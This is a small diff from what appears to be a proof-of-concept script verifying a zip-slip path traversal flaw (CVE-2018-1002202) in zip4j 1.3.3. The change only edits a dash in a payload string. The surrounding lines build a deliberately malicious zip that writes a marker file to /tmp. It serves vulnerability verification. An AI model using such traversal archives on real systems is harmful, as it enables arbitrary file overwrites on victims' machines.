@@ -199,7 +199,7 @@ vs F-FTD-66 (SRU zip-slip):
     if mode == 'demo':
         print("--- Mode: create and verify zip traversal structure ---")
         target = "/tmp/ftd67-zipslip-proof.txt"
-        payload = b"F-FTD-67: zip4j 1.3.3 zip-slip confirmed — CVE-2018-1002202\n"
+        payload = b"F-FTD-67: zip4j 1.3.3 zip-slip confirmed - CVE-2018-1002202\n"
         artifact = "/tmp/ftd67_malicious.zip"
 
         zip_bytes = create_zipslip_zip(target, payload, artifact)
